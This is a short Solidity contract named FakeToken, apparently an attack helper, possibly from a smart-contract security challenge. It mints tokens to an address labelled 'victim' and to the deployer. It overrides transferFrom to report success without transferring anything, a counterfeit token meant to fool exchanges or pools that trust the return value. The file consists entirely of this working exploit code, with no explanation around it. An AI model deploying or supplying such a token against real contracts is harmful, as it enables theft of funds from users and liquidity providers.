// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {

    constructor(address victim) public ERC20("FakeToken","FT") {
        _mint(victim,1);
        _mint(msg.sender,2);
    }

    function transferFrom(address from, address to, uint amount) public override returns(bool){
        return true;
    }
}